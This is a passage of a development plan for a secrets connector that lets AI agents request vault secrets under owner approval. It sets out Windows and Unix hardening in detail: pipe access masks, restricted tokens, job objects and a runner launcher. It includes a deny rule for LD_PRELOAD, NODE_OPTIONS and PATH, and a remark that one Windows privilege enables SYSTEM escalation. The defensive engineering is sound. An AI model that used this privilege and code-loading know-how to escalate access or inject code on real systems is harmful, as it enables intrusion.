Small PRs on `vettid-agent`, one row each, every one with its tests.
Spec sections are VAULT-MESSAGING unless named. Each phase is tracked
as an issue in vettid-agent, opened in A0.1.

**Status (as of 2026-10-26; unchanged since 2026-10-23).** A0 to A3 (except A3.5 and A3.7 to A3.9)
and A5 are built in vettid-agent (pull requests #7 to #40, merged
2026-10-17 to 2026-10-20). A3.5 and A3.7 to A3.9 wait for the vault
items AV7 and AV9 to AV11 (not built in vettid-vault) in a staging release. A4 is v1.1 and not
started. A6 waits for the Android section "Devices & agents" (AA1 to
AA5), which is specified and approved but not built in the app
(ANDROID-PLAN §6). The plan's header status stays "draft": the plan does not say
what its approval requires beyond the owner's decisions of §2, which are
recorded as decided in the table and the changelog (0.1.4, 0.1.5).

### A0 — Retire the old code, skeleton, CI

*Status: done (vettid-agent #7, #8).*

| PR | Contents | Acceptance |
|---|---|---|
| A0.1 | Tag `legacy-v1-final`, branch `legacy/v1`; remove the old code; new `go.mod`, `cmd/vettid-agent` with `version`; README and CLAUDE.md rewritten (what the connector is, that it needs a staging vault until production lists `leash`); CI on Linux, macOS and Windows runners (actions pinned by SHA, `go-version-file`, `go vet`, `go test -race` where cgo exists, gitleaks, govulncheck); issue dispositions of §1; old releases marked | CI green on all three runners; `vettid-agent version` prints version, commit and Go version |
| A0.2 | The vettid-vault and vettid-relay dependencies at a pinned commit; `docs/SOURCE.md`; a compile test importing `client` and `vms/leashwire`; the `leash.json` check of §5 | CI green; `go mod verify`; the binary size recorded in the PR |

**Exit A0**: CI green on `main` on three platforms.

### A1 — State and protectors (a §9 rule 6 path)

*Status: done (A1.1 #16, #18; A1.2 #17, #20; A1.3 #19; A1.4 #21; A1.5 #35).*

| PR | Contents | Acceptance |
|---|---|---|
| A1.1 | `internal/state`: format, atomic write, lock, owner-only files (POSIX; Windows DACL), wipe; `statefile.json` | Vectors; a second process cannot take the lock; a group-readable file (POSIX) or a DACL with another user's entry (Windows job) is refused; a crash between write and rename leaves the old state readable |
| A1.2 | `internal/protect`: the interface and the passphrase protector (Argon2id, strength rules, prompt / fd / file sources) | Round trip; weak passphrases refused; the passphrase never reaches logs (a test greps the captured log) |
| A1.3 | Linux TPM 2.0 protector (pure-Go TPM library, resource manager device), with the fallback rule of AG3 | On a TPM machine: sealed key unseals; the state copied to another machine does not open; without a TPM, the passphrase protector is chosen and `status` says so. CI uses a software TPM simulator where available |
| A1.4 | Windows DPAPI protector (user scope, `golang.org/x/sys/windows`) | Windows job: round trip; another user cannot open (manual check recorded in the PR) |
| A1.5 | macOS Keychain protector (cgo; option A, §4.2): the data protection keychain only, `ThisDeviceOnly`, not synchronizable; `errSecMissingEntitlement` falls back to the passphrase protector with the reason | macOS job: the item's attributes (format) and the missing-entitlement path (an unsigned test binary falls back and says why). The round trip (the item is not synchronizable; deleting it makes the state unopenable) is a manual check on the owner's Mac once the signed app bundle of A5 exists |

### A2 — Pairing, the vault session, access sessions

*Status: done (A2.1 #22; A2.2 #23; A2.3 #24; A2.4 #32; follow-ups #25, #33).*

| PR | Contents | Acceptance |
|---|---|---|
| A2.1 | `vettid-agent pair`: code parsing, name, `client.New` + `Pair`, SAS, wait for `device.paired` / `device.pair.rejected` / 10 minutes, state saved per step | `invite.json`, `handshake.json`; unit tests with recorded messages for paired, rejected and expired; texts of §11 |
| A2.2 | `internal/vaultconn`, run inside `vettid-agent mcp`: one owning goroutine, long-poll collect, dispatch by `re`, save before ack (0.1.13: through vettid-vault's `Config.PersistBatch`, AV1, which hands the save the batch's unsaved responses and events, so the state derived from them is in the same write; vettid-agent #46), token and rekey maintenance, identity rotation, `device.unlinked` and `token_revoked` (AG12) | Unit tests: a crash after save and before ack replays without harm; a crash before save does not lose a rekey (the batch is collected again); `device.unlinked` wipes; `token_revoked` alone stops without wiping |
| A2.3 | `internal/access`: AG8's policy, `device.session.request`, `.granted`, `.ended`, expiry, `session_required`, `owner_check_required`; `status` | Unit tests for every branch of AG8 (one outstanding, 10-minute quiet period after a denial, 6 an hour) |
| A2.4 | `internal/devstack` harness (build tag `devstack`): find or start one dev stack, `vaultctl` as the app (§4.8), the relay mapping; `make devstack-test` running with `-p 1` | **Exit A2 test**: enroll a test vault with `vaultctl`, create and unlock its credential, pair the connector with `session_seconds: 600`, compare the SAS on both sides, see `vault.status` answered, end the session from the app, request a new one and approve it, unlink, see the connector wipe itself. A rejected pairing ends with "Rejected on your phone" |

### A3 — LEASH and the MCP server

*Status: A3.1 #26, A3.2 #27, A3.3 #28, A3.4 #32, A3.5 #43 (0.1.13) and A3.6 #36 are done (follow-ups #30, #34). A3.8a's `internal/run` package is done (#42, #51; 0.1.15; the ask-again rule of §4.4 is #48); the tool, its flags, the `item.run` send and A3.8a's dev-stack checks come with A3.8b. A3.7, A3.8b and A3.9 are not built. (0.1.16) A3.10a to A3.10c, A5.5 and A5.6 (the separate-account mode, AG14) are not built; A3.8b and A3.9 start only after A5.5 (owner edits #1002, #1003 applied 2026-11-21).*

| PR | Contents | Acceptance |
|---|---|---|
| A3.1 | `internal/leash`: grants from `leash.grant.updated` and `leash.grant.list` at each session start, `suspended`, status statement cache and refresh; grants shown by `vettid-agent status` and `leash.connection_info` | `leash.json`; unit tests: a revoked grant is never presented; nothing is presented while suspended; refresh at a quarter of the lifetime |
| A3.2 | `agent.request` (`catalog`, `item.get`, `item.use`) with `approval.waiting`, retries reusing the inner id, pending results kept 10 minutes (AG9), no retry after `forbidden` | Unit tests for allow, refer-then-approve, refer-then-deny, `approval_timeout`, `forbidden`, `owner_check_required`, locked vault |
| A3.3 | `internal/mcp` and `vettid-agent mcp`: the five LEASH tools over stdio, the local rate limit, golden files; README section for configuring MCP clients | Golden files; an MCP client library test drives `tools/list` and every tool against a fake vault connection; a second `mcp` on the same state exits with "in use by another agent app"; nothing is written to standard output but MCP messages |
| A3.4 | Dev-stack LEASH tests | **Exit A3 test**: with `vaultctl` as the app: a share rule for the agent (`share set -agent`, `ask`) → `leash.list_available` empty until the member approves the item → `leash.request_secret` returns the value; an `auto` rule within limits returns at once; past `per_hour` the request is referred and approved; `leash.execute_action` returns the HMAC the test computes; a critical item is never listed or readable; revoking the rule stops reads at once; a loop of refused requests suspends the connector and `leash.connection_info` shows it; `leash.agent.resume` restores it. **Hold step** (owner decision, 2026-10-18), against the real clock: set `owner_check.interval_seconds` to 3,600, wait for the deadline (about 65 minutes), see `owner_check_required`; a check and then a `vault.status` that is not held end it. Opt-in (`make devstack-hold-test`), not part of `make devstack-test`; no dev clock is added to the vault |
| A3.5 | Grant-set sequence numbers (§4.5; after AV7): the highest `grant_seq` kept in the state file; a higher one replaces the set; a lower one ignored; an equal one gives only fresher statements; `gen` kept for marks learned outside the sets; the `leash` state member at `"v": 2` | Unit tests: a list sent before a revocation and received after it does not bring the grant back; a higher-numbered update adds a grant; an equal number keeps the set and refreshes statements; a grant marked `not_found` stays dead under an equal or higher number until this process's own list answers; the pairing batch's number is not recorded; a re-paired state starts with none; a list or update without `grant_seq`, or with 0, is ignored and paced as a failed list, with `vault_too_old`; a `"v": 1` state member reads as number unknown |
| A3.6 | **README note now** (AG13; before any vault change): the note of §11 "README note" in vettid-agent's README, in the MCP section. **Done** in vettid-agent #36 (`5cd72fe`), with the text as merged | The README carries the text exactly |
| A3.7 | **Reveal as the last resort** (§4.9 "Reveal"; after AV9): `leash.request_secret`, and `leash.check_status` for an `item.get`, answer in one text block, no `structuredContent`, no output schema; descriptions in AG13's order; `ways`, `programs` and `hosts` in `leash.list_available`; `way_not_allowed` with the allowed ways | Golden files: `tools/list` shows no output schema for `leash.request_secret`, and its answer has exactly one content block and no `structuredContent`; the value appears once in the serialized answer; `way_not_allowed` gives its text with the ways; dev stack: an item without `reveal` refuses `leash.request_secret`, one with it is referred every time and returns the value once approved |
| A3.8a | **`leash.run_with_secret`, part 1** (§4.9 "Run"; after AV9, AV10): resolution and what is refused as a program; the hash, and running exactly what was hashed; the run's own directory; the minimal environment, the `env` allowlist and the code-loading refusals; the three ways to pass the secret; the operator's flags and their startup checks | Unit tests: the child's environment is exactly the minimal set plus the request's (a test program prints it); `LD_PRELOAD`, `NODE_OPTIONS` and `PATH` in `env` refused by the connector's own name rule (a fake vault's binding lists `NODE_OPTIONS`, which the real vault refuses in `leash.item.set`); a program the user can change refused while its entry has no pin; a name the binding does not list refused; a bare name is resolved on the fixed path only; a relative path with a separator refused (on Windows also `\` and a volume); `.bat` and `.cmd` run through `cmd.exe`, with an argument, variable, path or working folder holding a refused character refused (0.1.15); a junction in the path refused; the `sha256` sent is the file's; a file renamed, replaced or written in place between the hash and the start does not run (Windows: the write and the rename fail while held, and a started image that is not the held file is ended; Linux: the sealed copy runs; macOS: the copy runs, the remaining gap stated); a `#!` script refused, and a volume that is neither NTFS nor ReFS refused; the secret file is owner-only and gone after the run, and `run/` is emptied at start after a simulated crash; `--run-path` refuses a missing, relative or changeable directory or one below a changeable one, and more than 16; `--run-env` refuses a bad name and more than 32. Dev stack: a bound program's first run is referred with `program_unrecorded`, a matching later one runs without a prompt with `each: false`, a changed file, or a copy of the pinned file run from another folder, is referred with `program_changed`; a bound shell or interpreter is still referred; an unbound one is referred and the approval shows argv, directory and how; a shell is flagged |
| A3.8b | **`leash.run_with_secret`, part 2** (§4.9 "Run" and "Redaction"): output redaction, process group or job and its kill, the time, size and concurrency limits, `truncated`, referred runs started at once ; (0.1.15) also, moved from A3.8a: the `leash.run_with_secret` tool, the `--run-path` and `--run-env` flags with their startup checks, the `item.run` send, the run/proxy missing-`value` backstop, a check of the secret's variable name against `cmd.exe`'s own names, and A3.8a's dev-stack acceptance. (0.1.16) Starts only after A5.5; runs only in the separate-account mode (AG14), where `--run-path` and `--run-env` are read from the service's administrator-only configuration, not flags (§4.9), so the tool answers `separate_account_required` without the service and the process is started by A3.10c's runner start | Unit tests: each of the redacted forms of §4.9 is replaced, also when split across reads and in standard error; a value never appears in the answer, the logs or the run directory after the run; the time limit kills the whole process group; output past 1 MiB is truncated and flagged, and so is output cut at 64 KiB; a third run is `rate_limited_local` and no `item.run` is sent for it; a referred run starts when the approval arrives and its redacted answer is kept for `check_status`; runs are killed when the connector exits |
| A3.9 | **`leash.open_proxy`, `leash.close_proxy`** (§4.9 "Proxy"; after AV9, AV11). (0.1.16) Starts only after A5.5; only in the separate-account mode (AG14), the proxy living in the service, closing when its stub leaves | Unit tests against a local TLS test server with a test root: the header is added only to the bound host; an incoming copy of the header is dropped; a wrong token, a wrong `Host`, an `Origin` header, an absolute-form or `CONNECT` request get 403 or 405 and reach nothing; a redirect to another host becomes 502 `redirect_refused`, one to the same host is rewritten; the value and its encodings in response headers and body (also across chunk boundaries) are replaced; a compressed response is refused; a certificate not valid for the host fails; the proxy closes at `expires_at`, at `leash.close_proxy` and when the session ends. Dev stack: opening is referred and the approval shows host, header name and length |
| A3.10a | **The stub and the local channel** (0.1.16, AG14; card #15756; AGENT-SEPARATE-ACCOUNT §2, §4; Windows named pipe first, the Unix socket side comes with A5.6). `vettid-agent mcp --name <n>` as the stub: no keys, no state, no values; it passes MCP messages, framed as on stdio, between its standard input and output and the channel, unchanged, and exits when the client closes it (`--name <n>` takes the place of `--state-dir`; a second stub on a pairing gets "in use by another agent app"). The channel's two ends, usable by the service in A3.10b: the pipe `\\.\pipe\vettid-agent-<n>-<random>` created with `FILE_FLAG_FIRST_PIPE_INSTANCE`; an access list giving the member's SID exactly 0x120083 (see the erratum below), never `FILE_CREATE_PIPE_INSTANCE`, and only the service SID may create instances; `PIPE_REJECT_REMOTE_CLIENTS` and NETWORK denied; the client identified from its token at identification level and compared with the recorded member SID, anonymous and AppContainer tokens refused, the process id never used. **(0.1.16, the lead's call) Elevated commands, and who the channel admits:** the access list admits the member's SID and the Administrators group (on Linux, A5.6: the member's group, and root), but an elevated administrator or root who is not the member is admitted only for `pair`, `forget` and `status`, never for tools, and the operation is checked per client: `pair` and `forget` are accepted only from a client whose token shows an elevated administrator (Windows: the Administrators group enabled and a token at high integrity or above, System included, read from the pipe client's token at identification level; Linux: peer uid 0 by `SO_PEERCRED`, the command running under `sudo`), and refused from the member's normal process whatever the client says (the service-side check is A3.10b's). `share` is not built (card #15814, A5.5a). **Every client** (the stub, `pair`, `status` and `forget`) opens the pipe with `SECURITY_SQOS_PRESENT \| SECURITY_IDENTIFICATION` and checks the server by the pipe's owner SID through the open handle (note §4). **The channel takes no path and no configuration from the stub:** only `--name <n>` chooses the pairing, and the service never opens a path the stub names except as a tool's argument (`cwd`; note §4). The stub and service exchange versions on connect and a mismatch is refused with the NEW text of §11. **Without the service** (note §8): a run or proxy tool in a connector with no service installed (the same-account connector) answers `separate_account_required`; a stub whose channel is missing answers any tool with the "No service" text (the lead's call; the note gives both for the same case); neither runs the connector in its own process. No file descriptors or handles cross it **(0.1.17, erratum, the lead's calls, GC #15835; they replace the 0.1.16 wording where it differs.)** (1) The display-name flag is renamed `--label`; `--name <n>` stays the pairing's name. (2) The pipe's name lives in `%ProgramData%\VettID\agent\<n>.json`, owned by Administrators or SYSTEM and read-only for the member, and the stub checks that owner and access list before it reads the name (A3.10b writes it). (3) The service SID is computed from the service name, never read from a file. (4) A pairing name matches `^[a-z0-9][a-z0-9-]{0,31}$`; anything else is refused by the stub, `install` and `pair`. (5) **Without the service, or on a version mismatch, the stub serves MCP itself** (it answers `initialize` and `tools/list` and runs no connector code) **and answers every tool call with the approved text under a code:** `service_not_running` with the "No service" text, `versions_differ` with the "Versions differ" text (§4.1, §11). (6) The member's ACE on the pipe is **0x120083** (`FILE_READ_DATA`, `FILE_WRITE_DATA`, `READ_CONTROL`, `SYNCHRONIZE`, `FILE_READ_ATTRIBUTES`) and never `FILE_APPEND_DATA`, `FILE_WRITE_ATTRIBUTES`, `WRITE_DAC` or `WRITE_OWNER`. **Every client opens the pipe with exactly that mask** (Go: winio's `DialPipeAccess`, not `DialPipe`, which asks for more than the entry grants and would be refused), and the Administrators entry, for `pair`, `forget` and `status`, is the same 0x120083. (7) **`%ProgramData%\VettID\agent`** is created by `install`, owned by Administrators or SYSTEM and not writable by the member; the stub checks the folder and the file (owner and access list) before reading the pipe's name, and a refusal is the code `config_refused` with the NEW text of §11 (§4.1). (8) **Account names** come from a short hash, never the pairing name (they must fit Windows' 20-character limit): Windows `vtdr-<8 hex>-1` and `-2` (the runners; the connector is the virtual service account `NT SERVICE\vettid-agent-<n>`, 0.1.19), at most 15 characters; Linux `vettid-c-<8 hex>` and `vettid-r-<8 hex>-1` and `-2`; the hex is the first 8 digits of the SHA-256 of the pairing name; `install` refuses a hash that collides with an existing account. The pairing-name pattern stays, and `con`, `nul`, `aux`, `prn`, `com1` to `com9` and `lpt1` to `lpt9` are refused as pairing names (they name devices in file paths). (9) **`vettid-agent pair --name <n>` selects the pairing** in the separate-account mode, and **`--label <text>` sets the name the phone shows** (the old display flag; vettid-agent's code has the retired `init` command only, so the old name is not in it). §11's "Not paired" text already says `pair --name <n>`; the other `pair` texts below are the same-account connector's, where `pair` takes no `--name`. | Windows tests (the note's §10 list): (0.1.17) the member's ACE reads 0x120083 and none of the four refused rights; a name outside the pattern is refused; the stub with no service, and with a version mismatch, answers `initialize`, `tools/list` and each tool call with its code and text; the pipe's configuration file with another owner or a member-writable access list is refused; the pipe refuses another user, an anonymous client, an AppContainer client and a remote one; the stub, `status` and an elevated `pair` each refuse a server whose owner SID is not the service's (a test server run by another user, a squatted pipe); (the squatted name stopping the service from starting, with `status` saying so, is tested with A3.10b's service); a version mismatch is refused with its text; the stub holds no key or state (a run with the state folder unreadable still passes MCP messages); an elevated administrator who is not the member gets no tool answers (`pair`, `forget` and `status` only); the stub exits when the client closes; golden files show stdout carries only MCP messages; no listener but the pipe. Run against a test host and test accounts, never the implementing agent's own (0.1.17, fix round) A stub opens the pipe with exactly 0x120083 and a real stub connects to a real service (a test that fails if the access mask asks for more); the Administrators entry is 0x120083; `%ProgramData%\VettID\agent` or its file owned by a non-administrator or writable by the member is refused with `config_refused`; the account names are the hash forms, a name that hashes to an existing account is refused, `con`, `nul`, `aux`, `prn`, `com1` and `lpt9` are refused as pairing names. |
| A3.10b | **The connector service per pairing, Windows** (0.1.16, AG14; card #15757; note §3, §5; after A3.10a). The connector as built (pairing, vault session, LEASH, tools) as a Windows service per pairing, `NT SERVICE\vettid-agent-<n>`, with its privileges cut to `SeChangeNotifyPrivilege` only (no impersonation privilege, and none that starts a process under another token). **(0.1.19, erratum, the owner's decision, GC #15936; measured by the CI probe of vettid/vettid-agent#53 at 1842446 on windows-2025) The connector's account is always the virtual service account, with no local-user fallback.** By default a virtual account holds `SeChangeNotifyPrivilege`, `SeImpersonatePrivilege`, `SeCreateGlobalPrivilege` and `SeIncreaseWorkingSetPrivilege` and lacks `SeAssignPrimaryTokenPrivilege` and `SeIncreaseQuotaPrivilege`. With the required-privileges list cut to `SeChangeNotifyPrivilege` alone and no LSA grant, the service starts holding only that privilege, and `CreateProcessAsUser` is refused (error 1314), which is intended: runs start through the secondary-logon service (A3.10c). **Route A is rejected** (the owner's reason): granting `SeAssignPrimaryTokenPrivilege` to the service SID through LSA works (measured: that privilege alone is enough, `SeIncreaseQuotaPrivilege` is not needed), but it is widely treated as enough to reach SYSTEM (the public potato-family tools), so a compromised connector could likely become SYSTEM. So the installer (A5.5), and the CI test installer, must do two things: (1) set the service's required-privileges list to exactly `SeChangeNotifyPrivilege` (`SERVICE_CONFIG_REQUIRED_PRIVILEGES_INFO`), with no LSA grant to the service SID; (2) set `SidType` unrestricted. **The service checks its own token at start and refuses to run** (an Event Log entry, and `status` saying why) **if it holds any privilege beyond `SeChangeNotifyPrivilege`,** in particular `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeIncreaseQuotaPrivilege` or `SeTcbPrivilege`, **or if its account is in Administrators or in any group beyond the defaults** (the virtual account's default groups are still to be read: step 3 of vettid/vettid-agent#60 did not read them; the self-check compares with that list) (0.1.19, the lead's call). When the service refused to start, the stub answers `status`: it reads the service's state and the Event Log entry and says why. The service creates the pipe with its owner set explicitly to the per-service SID (`NT SERVICE\<service name>`, computed from the name), so the stub's and `pair`'s owner check expects that one SID. A program that loads user32 needs a window station and desktop of its own; that is A3.10c's. State under `%ProgramData%\VettID\agent\<n>\`, owner the service SID only; keys by DPAPI of that account (§4.2); a configuration file only administrators can change (the pipe's random name, readable by the member; `--run-path` and `--run-env`). Started on demand by the stub and stopped a while after the last stub leaves, catching up on start (§4.6); the access session treated as unknown after a resume or a clock jump until `vault.status` answers; proxies close when their stub leaves; crash restart by the recovery actions, at most a few times a minute; logs to the Event Log under the pairing's name, with the pairing's name, the tool, the outcome code and a resolved program path only, never arguments, `cwd`, variable names or values; `status` shows the latest refusal reasons. A service whose connector account turns out to be the member's or an administrator's refuses runs and proxies, and `status` says why (the runner half is A3.10c's). **The stop rule (the lead's call, §4.9):** the service does not stop while a run is in flight (a referred run still waiting for approval after its stub left counts) or while a run's answer is still kept (10 minutes); its idle stop counts from then. **Elevated commands (the lead's call):** the service accepts `pair` and `forget` only from a client whose token shows an elevated administrator (Administrators group enabled, high-integrity token, read from the pipe client's token at identification level) and refuses them from the member's normal process whatever the client says; the pipe's squatted-name case stops the service from starting and `status` says so | Windows tests (the note's §10 list): the service account's DPAPI opens the state and another account's does not; the service holds no impersonation privilege; the member's account cannot read the state folder or open the service's process; a second Windows user is refused at the pipe; the service starts on a stub's connect and stops after the last leaves; a stub leaves during a run and the service stays up until the run ends and its answer has been kept 10 minutes (also for a referred run still waiting for approval); a squatted pipe name stops the service from starting and `status` says so; the connector's account being made the member's or an administrator's refuses runs and proxies with `status` saying why; a crash restarts it; sleep and resume; the logs hold no value, argument, `cwd`, code, SAS or address; unsigned-build behavior under Defender, SmartScreen and Smart App Control is recorded (Authenticode waits for the business entity, A5.3) (0.1.17, fix round) The pipe's owner is the per-service SID of the virtual service account, and the stub's owner check passes for it and refuses a pipe owned by anyone else. (0.1.17, GC #15862 a) A member whose token holds Administrators, deny-only or enabled, gets `member_is_admin` on every tool, while `status` (and, elevated, `forget`) still work for that member. (0.1.19, GC #15936) The started service's token holds exactly `SeChangeNotifyPrivilege` (read from the token, not from the configuration) and no `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeIncreaseQuotaPrivilege` or `SeTcbPrivilege`; `CreateProcessAsUser` from the service is refused (error 1314); a token holding any other privilege (the default list left in place, or an LSA grant added) is refused by the self-check with an Event Log entry and `status` saying why; `SidType` reads unrestricted; DPAPI works; a service account added to Administrators or to a group beyond the defaults is refused by the self-check, and `status` (answered by the stub from the service's state and the Event Log entry) says why. The Windows 10 and 11 client SKUs are not yet measured; the exact-set self-check fails closed if a SKU adds a privilege. |
| A3.10c | **Runner accounts and runs as the runner, Windows** (0.1.16, AG14; card #15758; note §2, §3, §6; after A3.10b). Two local users per pairing, `vtdr-<8 hex>-1` and `-2` (the hash of A3.10a (8), at most 15 characters). **(0.1.19, the owner's decision, GC #15936) Their rights (the lead's call, fix round):** `install` grants `SeInteractiveLogonRight` to the two runners explicitly and checks the effective right (the owner accepted this cost); the denies of RDP logon (`SeDenyRemoteInteractiveLogonRight`) and network logon (`SeDenyNetworkLogonRight`) are re-checked only by the elevated `status` and at install and upgrade (an administrator can read LSA rights; the service, with ChangeNotify only, cannot: `LsaEnumerateAccountRights` returns STATUS_ACCESS_DENIED, 0xC0000022, measured by vettid/vettid-agent#60; not measured: a network-logon attempt with the runner's password should fail with 1385, and RDP denial cannot be checked that way); no batch right; "password never expires"; hidden from the sign-in screen (`SpecialAccounts\UserList`); a random password that meets the computer's local complexity policy (`install` checks the policy and refuses when it cannot make one), kept only under the connector's DPAPI, never shown or logged. A runner also denied interactive logon was refused in the probe (error 1385), so interactive logon must not be denied. **Lockout:** a process that guesses a runner's password can lock that runner (a denial of service only, never an entry); `status` says the runner is locked. **Measured (vettid/vettid-agent#57 at 68794ee, windows-2025, all asserted):** a runner with no batch right starts a launcher through seclogon; console logon denied gives 1385, a password that must change gives 1907 (the "never expires" flag overrides it), and seclogon Disabled gives 1058; the explicit `SeInteractiveLogonRight` grant is not strictly needed on a default image (Users holds it), and the grant and the check of the effective right stay for hardened machines. **A run starts in stages (the lead's call, 0.1.19 fix round; measured, 0.1.19).** (a) The service starts the **launcher** (in the administrator-only folder with the program files) through the secondary-logon service: `CreateProcessWithLogonW` with the runner's name and password (the service does not hold `SeAssignPrimaryTokenPrivilege`, A3.10b), `dwLogonFlags` exactly 0 (never `LOGON_NETCREDENTIALS_ONLY`, which would run as the connector; no profile), **`CREATE_NO_WINDOW`** (seclogon refuses `DETACHED_PROCESS` for it) (the launcher is a GUI-subsystem executable, so the flag is ignored and not relied on; measured by vettid/vettid-agent#60), a non-null `lpDesktop` (the run's own desktop), suspended, assigned to the run's kill-on-close job (one job per run), then resumed. **The job is mandatory** (the service cannot end a program without it, measured), with no breakaway and the UI limits `JOB_OBJECT_UILIMIT_HANDLES`, `GLOBALATOMS`, `DESKTOP`, `READCLIPBOARD`, `WRITECLIPBOARD`, `EXITWINDOWS`, `SYSTEMPARAMETERS` and `DISPLAYSETTINGS`, **set before the resume and mandatory** (measured: CreateDesktop is denied only with them, and global atoms are separate only with them); a run whose job or limits cannot be set is refused. (b) **The launcher locks its own token and process:** their access lists become SYSTEM full plus OWNER RIGHTS with only TOKEN_QUERY (token) and SYNCHRONIZE and QUERY_LIMITED_INFORMATION (process); the token is owned by the runner, so OWNER RIGHTS applies to it. **The lock is required.** Measured: without it the program can open the launcher's process (VM_WRITE, CREATE_THREAD, WRITE_DAC) and token (DUPLICATE, IMPERSONATE, READ_CONTROL, WRITE_DAC, WRITE_OWNER) and copy a token with INTERACTIVE enabled, even after the launcher has exited and the service has closed its handles to it (something keeps the dead launcher's object alive; not a conhost; the holder is unknown). With the lock every open is refused. (c) The launcher opens and holds `cwd` (§4.9) and builds a **restricted token from its own token**: every privilege removed but `SeChangeNotifyPrivilege`, INTERACTIVE deny-only (LOCAL is absent on the run's desktop, so no LOCAL step is needed). It starts the program with `CreateProcessAsUser` on that token: **suspended, `DETACHED_PROCESS`**, with `PROC_THREAD_ATTRIBUTE_HANDLE_LIST` limited to the standard handles, in the held folder. The program token's default access list also grants the service's SID SYNCHRONIZE, QUERY_LIMITED_INFORMATION and TERMINATE (0x101001), and the launcher sets the program thread's access list to give the service SYNCHRONIZE, QUERY_LIMITED_INFORMATION and THREAD_SUSPEND_RESUME (not through the default list, since 0x2 on a process is CREATE_THREAD). The default list (0x101001 to the service) also applies to objects the program creates without an access list; that is harmless. (d) The launcher reports the program's process and thread ids to the service and **exits**. The service waits for the launcher's exit, closes its handles to it, and **waits until the job's process list is exactly the program** (the belt for the launcher's conhost; the GUI-subsystem launcher has none). It checks `GetProcessIdOfThread(th) == pid`, `IsProcessInJob`, and the program's image (`QueryFullProcessImageNameW`, measured possible) against the pinned file (§4.9; the service's own read of the image decides; the launcher's check is a pre-check.). Only then does it resume the program. The order is suspend, job, lock, check, resume. **Output:** the service creates the standard pipes and passes them through the launcher's standard handles to the program (measured by vettid/vettid-agent#60: the service creates them non-inheritable and passes them with `STARTF_USESTDHANDLES` to `CreateProcessWithLogonW`; they arrive at the launcher as inheritable handles either way, and the launcher passes them in the program's handle list; output from the launcher and the program reaches the service after the launcher exits); with `DETACHED_PROCESS` there is no console, and no conhost exists while the program runs (measured: the job holds only the program). (e) §4.9's `AccessCheck` for read-only folders uses the **program's** token (restricted), not the launcher's. Measured: the launcher builds the restricted token and starts the program on it with `CreateProcessAsUser` without any privilege. **Order in the launcher (0.1.19, second review round):** after the lock, `OpenProcessToken` on itself is denied (measured by vettid/vettid-agent#60), so it opens its token handle, with the rights `CreateRestrictedToken` needs, **before** the lock and builds the program's restricted token from that handle (measured: INTERACTIVE deny-only, `SeChangeNotifyPrivilege` only). **The launcher's conhost (0.1.19; measured by vettid/vettid-agent#60 at 380958b, windows-2025, asserted):** with `CREATE_NO_WINDOW` the launcher has a conhost, and it holds an INTERACTIVE-enabled copy of the unlocked token (measured). It was gone by the time the program ran in every run, but that depends on timing, not a guarantee. **Design (the lead's call):** the launcher is a **GUI-subsystem executable, built with `-ldflags -H=windowsgui`** (not a patched binary, which would break an Authenticode signature). It has no console and no conhost (measured with an equivalent subsystem-2 binary), and the lock, the handoff, the resume, the output and the report work the same (measured). `CREATE_NO_WINDOW` is ignored for a GUI image, so nothing relies on it. Fallbacks, if ever needed: `FreeConsole` ends the conhost at once (measured), or the launcher locks the conhost's process and token (measured). **The belt (keep):** the service resumes the program only once the job's process list is exactly the program. **The report channel (the lead's call, with the tightening; only the content and the two refusals were measured, by vettid/vettid-agent#60 at 380958b):** a per-run named pipe the service creates before the launcher starts: a random name of at least 48 bits, `FILE_FLAG_FIRST_PIPE_INSTANCE`, one instance, `PIPE_REJECT_REMOTE_CLIENTS`; its name is on the launcher's command line. Its access list grants the service and that runner only, the runner with write-only rights (no `FILE_CREATE_PIPE_INSTANCE`, 0x4). The service checks that `GetNamedPipeClientProcessId` equals the launcher's process id, and the launcher opens the pipe with exactly `FILE_WRITE_DATA|SYNCHRONIZE` and `SECURITY_SQOS_PRESENT|SECURITY_IDENTIFICATION`, never `GENERIC_WRITE`: on a pipe GENERIC_WRITE includes 0x4 (FILE_APPEND_DATA, the same bit as `FILE_CREATE_PIPE_INSTANCE`), which the runner's entry withholds, so the open would be refused. The 48-bit name, the one instance, the write-only runner entry, the `GetNamedPipeClientProcessId` check and the SQOS flags are the lead's design, not measured. The launcher reports through it the `cwd` final path and whether it is listable, the lock's result, and the program's process and thread ids (these four measured), and the read-only `AccessCheck` result and the image's volume serial number and file index (§4.9; design, not measured). Another runner and a plain local user are refused both read and write (measured). The report is a claim: the service verifies the ids through the job, `GetProcessIdOfThread`, the creation time and the image. The standard handles are the program's alone. **Failure handling (the lead's call):** the launcher never starts the program unless the lock, the default access list and the thread's access list all succeeded, and it reports each result. On any failure, or on a timeout, the service closes the job (which kills everything in it), removes the station entry and the desktop, and refuses the run with the NEW §11 text "The program could not be started safely (<step>)."; `status` and the Event Log name the step. The failures covered: the lock or an access list failing; the restricted token or `CreateProcessAsUser` failing; the launcher exiting without a report; ids that fail `GetProcessIdOfThread`, `IsProcessInJob` or the image check; the job not coming down to exactly the program within 5 s; `ResumeThread` returning a count other than 1. Then the slot goes through its usual cleanup. **The setup steps before the launcher starts (the lead's call):** the desktop, the station entry, the report pipe (its creation, or a client process id that is not the launcher's), the output pipes, and the job with its assignment and its UI limits. A failure in any of them refuses the run with the same NEW text, naming the step, and whatever was made is removed. If removing the 0x20060 station entry or closing the desktop after a run fails, the slot stays out of use and `status` names it. **Real tools** run as the program: git, node, npm (through `cmd.exe`), ssh and python. Measured from a service in session 0, with and without the profile loaded (the probe started the program itself, not a launcher): the child runs as exactly the runner (its SID read back) and exits 0; closing the job kills it. The call starts `seclogon` on demand (measured with it stopped and set to Manual); the installer does not change it. If the secondary logon service cannot be started (Disabled, or its access list does not allow the service's account, `vettid-agent-<n>`), a run is refused with the NEW text of §11; seclogon's default access list lets the virtual account start it (`OpenService(SERVICE_START)` succeeded in the probe; the mechanism, client `StartService` or trigger start, was not told apart). A runner that cannot sign in is refused with the NEW text "The run account could not sign in" of §11, by errno. `CreateProcessWithLogonW` takes no handle-list attribute, so the launcher's standard handles are passed by `STARTF_USESTDHANDLES` (measured by vettid/vettid-agent#60: the service creates them non-inheritable and passes them with `STARTF_USESTDHANDLES` to `CreateProcessWithLogonW`; they arrive at the launcher as inheritable handles either way, and the launcher passes them in the program's handle list; output from the launcher and the program reaches the service after the launcher exits), and the program's handles are limited by the handle-list attribute in stage (c). **Every handle the connector creates is non-inheritable.** **The window station and desktop (measured):** the connector's virtual account cannot create a window station (access denied; a create with a null name returns the 